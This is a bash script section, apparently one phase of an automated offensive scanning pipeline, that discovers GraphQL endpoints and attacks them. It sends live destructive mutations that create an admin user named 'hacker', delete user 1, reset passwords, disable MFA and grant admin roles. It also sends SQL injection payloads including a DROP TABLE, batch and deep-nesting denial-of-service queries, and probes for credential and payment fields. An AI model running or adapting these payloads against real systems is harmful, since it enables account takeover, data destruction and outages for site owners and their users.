#======================= PHASE 16: GRAPHQL FULL AUDIT =======================
# Introspection, batch DoS, field suggestion, clairvoyance, injection via GQL

_gql_discover_endpoints() {
    local GQL_DIR="$1"
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"

    log "[GQL] Discovering GraphQL endpoints..."
    local -a GQL_PATHS=(
        "/graphql" "/api/graphql" "/graphiql" "/graph" "/gql"
        "/api/gql" "/v1/graphql" "/v2/graphql" "/v3/graphql"
        "/query" "/api/query" "/graphql/console" "/playground"
        "/graphql/playground" "/altair" "/graphql/v1" "/graphql/v2"
        "/api/graphql/v1" "/api/graphql/v2" "/graphql/api"
    )

    : > "$GQL_DIR/endpoints.txt"
    head -30 "$ALIVE_FILE" 2>/dev/null | while IFS= read -r BASEURL; do
        BASEURL="${BASEURL%/}"
        for PATH in "${GQL_PATHS[@]}"; do
            local TARGET="${BASEURL}${PATH}"
            local RESP_CODE
            RESP_CODE=$(curl_safe -sk -o /dev/null -w "%{http_code}" \
                -X POST "$TARGET" \
                -H "Content-Type: application/json" \
                -d '{"query":"{__typename}"}' \
                --max-time 8 2>/dev/null || echo "000")
            if [[ "$RESP_CODE" =~ ^[23] ]]; then
                # Verify it's actually GraphQL by checking for 'data' key
                local BODY
                BODY=$(curl_safe -sk -X POST "$TARGET" \
                    -H "Content-Type: application/json" \
                    -d '{"query":"{__typename}"}' \
                    --max-time 8 2>/dev/null)
                if echo "$BODY" | grep -qiE '"data"|"errors"|"__typename"'; then
                    echo "$TARGET" >> "$GQL_DIR/endpoints.txt"
                    success "GraphQL endpoint found: $TARGET"
                fi
            fi
        done
    done
    local GQL_COUNT
    GQL_COUNT=$(wc -l < "$GQL_DIR/endpoints.txt" 2>/dev/null || echo 0)
    info "[GQL] Found $GQL_COUNT GraphQL endpoints"
}

_gql_introspection() {
    local ENDPOINT="$1"
    local GQL_DIR="$2"
    local SAFE_NAME
    SAFE_NAME=$(echo "$ENDPOINT" | md5sum | cut -d' ' -f1)

    log "[GQL] Testing introspection on $ENDPOINT..."

    local INTROSPECT_QUERY='{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name kind } } } } } } }"}'

    local RESP
    RESP=$(curl_safe -sk -X POST "$ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "$INTROSPECT_QUERY" \
        --max-time 15 2>/dev/null)

    if echo "$RESP" | jq -e '.data.__schema' &>/dev/null 2>/dev/null; then
        echo "$RESP" > "$GQL_DIR/introspect_${SAFE_NAME}.json"
        vuln "GQL INTROSPECTION ENABLED: $ENDPOINT"
        notify_vuln "medium" "GraphQL Introspection: $ENDPOINT exposes full schema"

        # Extract all types and fields
        echo "$RESP" | jq -r '
            .data.__schema.types[]? |
            select(.kind == "OBJECT" and (.name | startswith("__") | not)) |
            "Type: \(.name)\n" + (
                .fields[]? |
                "  Field: \(.name) (args: \([.args[]?.name] | join(", ")))"
            )
        ' 2>/dev/null > "$GQL_DIR/schema_${SAFE_NAME}.txt" || true

        return 0
    fi

    # Introspection disabled — try bypass techniques
    log "[GQL] Introspection disabled — trying bypass..."
    local -a BYPASS_QUERIES=(
        '{"query":"query IntrospectionQuery { __schema { types { name } } }"}'
        '{"query":"{\n__schema{\ntypes{\nname\n}\n}\n}"}'
        '{"query":"{__schema{types{name}}}"}'
        '{"operationName":"IntrospectionQuery","variables":{},"query":"fragment FullType on __Type { kind name fields(includeDeprecated: true) { name } } query IntrospectionQuery { __schema { types { ...FullType } } }"}'
    )
    for BQ in "${BYPASS_QUERIES[@]}"; do
        local BRESP
        BRESP=$(curl_safe -sk -X POST "$ENDPOINT" \
            -H "Content-Type: application/json" \
            -H "X-Apollo-Tracing: 1" \
            -d "$BQ" --max-time 10 2>/dev/null)
        if echo "$BRESP" | grep -q "__schema\|types"; then
            echo "Introspection bypass worked on: $ENDPOINT" >> "$GQL_DIR/introspect_bypasses.txt"
            echo "$BRESP" > "$GQL_DIR/introspect_bypass_${SAFE_NAME}.json"
            vuln "GQL INTROSPECTION BYPASS: $ENDPOINT"
            notify_vuln "high" "GraphQL Introspection Bypass: $ENDPOINT"
            return 0
        fi
    done
    return 1
}

_gql_field_suggestion() {
    local ENDPOINT="$1"
    local GQL_DIR="$2"

    log "[GQL] Field suggestion oracle (clairvoyance technique)..."

    # Common sensitive field names to probe
    local -a PROBE_FIELDS=(
        "password" "secret" "token" "apiKey" "api_key" "admin"
        "adminUser" "users" "allUsers" "mutations" "createAdmin"
        "deleteUser" "updatePassword" "resetToken" "internalNote"
        "creditCard" "ssn" "dob" "privateKey" "credentials"
    )

    for FIELD in "${PROBE_FIELDS[@]}"; do
        local RESP
        RESP=$(curl_safe -sk -X POST "$ENDPOINT" \
            -H "Content-Type: application/json" \
            -d "{\"query\":\"{${FIELD}}\"}" \
            --max-time 8 2>/dev/null)

        # GraphQL "Did you mean" suggestion reveals valid fields
        if echo "$RESP" | grep -qiE "did you mean|suggestions|Cannot query field.*${FIELD}"; then
            echo "Field suggestion: $ENDPOINT → $FIELD" >> "$GQL_DIR/field_suggestions.txt"
        fi
        # If field exists (not "Cannot query field")
        if echo "$RESP" | grep -qiE '"data"' && ! echo "$RESP" | grep -qiE "Cannot query|Unknown field"; then
            echo "VALID FIELD: $ENDPOINT → $FIELD" >> "$GQL_DIR/valid_fields.txt"
            vuln "GQL SENSITIVE FIELD: $ENDPOINT exposes field '$FIELD'"
        fi
    done
}

_gql_batch_dos() {
    local ENDPOINT="$1"
    local GQL_DIR="$2"

    log "[GQL] Batch query DoS test on $ENDPOINT..."

    # Build a batch of 100 introspection queries
    local BATCH="["
    for i in $(seq 1 100); do
        BATCH="${BATCH}{\"query\":\"{__typename}\"},"
    done
    BATCH="${BATCH%,}]"

    local START_TS
    START_TS=$(date +%s%3N)
    local HTTP_CODE
    HTTP_CODE=$(curl_safe -sk -o /dev/null -w "%{http_code}" \
        -X POST "$ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "$BATCH" \
        --max-time 30 2>/dev/null || echo "000")
    local END_TS
    END_TS=$(date +%s%3N)
    local ELAPSED=$(( END_TS - START_TS ))

    if [[ "$HTTP_CODE" =~ ^2 ]]; then
        echo "Batch DoS accepted: $ENDPOINT | 100 queries in ${ELAPSED}ms | HTTP $HTTP_CODE" \
            >> "$GQL_DIR/batch_dos.txt"
        if [ "$ELAPSED" -gt 5000 ]; then
            vuln "GQL BATCH DoS: $ENDPOINT took ${ELAPSED}ms for 100-query batch"
            notify_vuln "high" "GraphQL Batch DoS: $ENDPOINT accepted 100 batched queries in ${ELAPSED}ms"
        else
            info "[GQL] Batch accepted in ${ELAPSED}ms (batch DoS possible, but server is fast)"
        fi
    elif [[ "$HTTP_CODE" =~ ^4 ]]; then
        echo "Batch rejected (HTTP $HTTP_CODE): $ENDPOINT" >> "$GQL_DIR/batch_dos.txt"
    fi
}

_gql_mutation_audit() {
    local ENDPOINT="$1"
    local GQL_DIR="$2"

    log "[GQL] Dangerous mutation audit on $ENDPOINT..."

    local -a MUTATIONS=(
        '{"query":"mutation { createUser(username:\"hacker\",password:\"hacked\",role:\"admin\") { id } }"}'
        '{"query":"mutation { deleteUser(id:1) { success } }"}'
        '{"query":"mutation { updatePassword(userId:1,newPassword:\"hacked\") { success } }"}'
        '{"query":"mutation { resetUserPassword(email:\"admin@admin.com\") { token } }"}'
        '{"query":"mutation { disableMFA(userId:1) { success } }"}'
        '{"query":"mutation { grantRole(userId:1,role:\"admin\") { success } }"}'
    )

    for MUT in "${MUTATIONS[@]}"; do
        local RESP
        RESP=$(curl_safe -sk -X POST "$ENDPOINT" \
            -H "Content-Type: application/json" \
            -d "$MUT" \
            --max-time 10 2>/dev/null)
        if echo "$RESP" | grep -qiE '"data".*\{' && ! echo "$RESP" | grep -qiE '"errors"'; then
            echo "DANGEROUS MUTATION: $ENDPOINT | $MUT" >> "$GQL_DIR/mutation_hits.txt"
            vuln "GQL DANGEROUS MUTATION: $ENDPOINT accepted unauthenticated mutation"
            notify_vuln "critical" "GraphQL Unauth Mutation: $ENDPOINT accepted sensitive mutation without auth"
        fi
    done
}

_gql_injection() {
    local ENDPOINT="$1"
    local GQL_DIR="$2"

    log "[GQL] GraphQL injection (SQLi via args)..."

    local -a SQLI_PAYLOADS=(
        "' OR '1'='1"
        "\" OR \"1\"=\"1"
        "1; DROP TABLE users; --"
        "1' AND SLEEP(5)--"
        "' UNION SELECT 1,2,3--"
    )

    for PAYLOAD in "${SQLI_PAYLOADS[@]}"; do
        local RESP
        RESP=$(curl_safe -sk -X POST "$ENDPOINT" \
            -H "Content-Type: application/json" \
            -d "{\"query\":\"{user(id:\\\"${PAYLOAD}\\\") { id name email }}\"}" \
            --max-time 10 2>/dev/null)
        if echo "$RESP" | grep -qiE "syntax error|sql|mysql|postgres|sqlite|invalid query"; then
            echo "GQL SQLi: $ENDPOINT | payload: $PAYLOAD" >> "$GQL_DIR/gql_injection.txt"
            vuln "GQL SQLi ERROR: $ENDPOINT leaks SQL error with payload: $PAYLOAD"
        fi
    done
}

_gql_depth_limit() {
    local ENDPOINT="$1"
    local GQL_DIR="$2"

    log "[GQL] Query depth/complexity limit test on $ENDPOINT..."

    # Deeply nested query (resource exhaustion)
    local DEEP_Q='{"query":"{user{friends{friends{friends{friends{friends{friends{friends{friends{id name}}}}}}}}}}"}'

    local START_TS END_TS ELAPSED
    START_TS=$(date +%s%3N)
    local RESP_CODE
    RESP_CODE=$(curl_safe -sk -o /dev/null -w "%{http_code}" \
        -X POST "$ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "$DEEP_Q" \
        --max-time 20 2>/dev/null || echo "000")
    END_TS=$(date +%s%3N)
    ELAPSED=$(( END_TS - START_TS ))

    echo "Depth query: $ENDPOINT | HTTP $RESP_CODE | ${ELAPSED}ms" >> "$GQL_DIR/depth_test.txt"
    if [[ "$RESP_CODE" =~ ^2 ]] && [ "$ELAPSED" -gt 3000 ]; then
        vuln "GQL NO DEPTH LIMIT: $ENDPOINT | deep nested query took ${ELAPSED}ms"
        notify_vuln "medium" "GraphQL No Depth Limit: $ENDPOINT — nested query in ${ELAPSED}ms (DoS risk)"
    fi
}

phase_16_graphql() {
    if phase_done "phase_16"; then return 0; fi
    [ "$GRAPHQL_AUDIT_MODE" -ne 1 ] && { info "GraphQL audit disabled — skipping phase 16"; return; }
    phase_banner "PHASE 16: GRAPHQL FULL AUDIT"

    local START_TIME
    START_TIME=$(date +%s)
    local GQL_DIR="$OUTDIR/advanced/graphql"
    mkdir -p "$GQL_DIR"

    : > "$GQL_DIR/endpoints.txt"
    : > "$GQL_DIR/field_suggestions.txt"
    : > "$GQL_DIR/valid_fields.txt"
    : > "$GQL_DIR/batch_dos.txt"
    : > "$GQL_DIR/mutation_hits.txt"
    : > "$GQL_DIR/gql_injection.txt"

    # Discover endpoints
    _gql_discover_endpoints "$GQL_DIR"

    local GQL_COUNT
    GQL_COUNT=$(wc -l < "$GQL_DIR/endpoints.txt" 2>/dev/null || echo 0)
    if [ "$GQL_COUNT" -eq 0 ]; then
        info "No GraphQL endpoints found — skipping GraphQL audit"
        mark_done "phase_16"
        return
    fi

    # Audit each endpoint
    while IFS= read -r ENDPOINT; do
        log "[GQL] Auditing: $ENDPOINT"
        _gql_introspection "$ENDPOINT" "$GQL_DIR"
        _gql_field_suggestion "$ENDPOINT" "$GQL_DIR"
        _gql_batch_dos "$ENDPOINT" "$GQL_DIR"
        _gql_mutation_audit "$ENDPOINT" "$GQL_DIR"
        _gql_injection "$ENDPOINT" "$GQL_DIR"
        _gql_depth_limit "$ENDPOINT" "$GQL_DIR"
    done < "$GQL_DIR/endpoints.txt"

    local INTRO_CNT FIELD_CNT BATCH_CNT MUT_CNT
    INTRO_CNT=$(wc -l < "$GQL_DIR/introspect_bypasses.txt" 2>/dev/null || echo 0)
    FIELD_CNT=$(wc -l < "$GQL_DIR/valid_fields.txt" 2>/dev/null || echo 0)
    BATCH_CNT=$(wc -l < "$GQL_DIR/batch_dos.txt" 2>/dev/null || echo 0)
    MUT_CNT=$(wc -l < "$GQL_DIR/mutation_hits.txt" 2>/dev/null || echo 0)

    success "PHASE 16 DONE — Endpoints: $GQL_COUNT | Introspect bypass: $INTRO_CNT | Fields: $FIELD_CNT | Mutations: $MUT_CNT | Time: $(( $(date +%s) - START_TIME ))s"
    notify "Phase 16: GraphQL done — $GQL_COUNT endpoints, $MUT_CNT dangerous mutations found" "🔷"
    mark_done "phase_16"
    echo ""
}
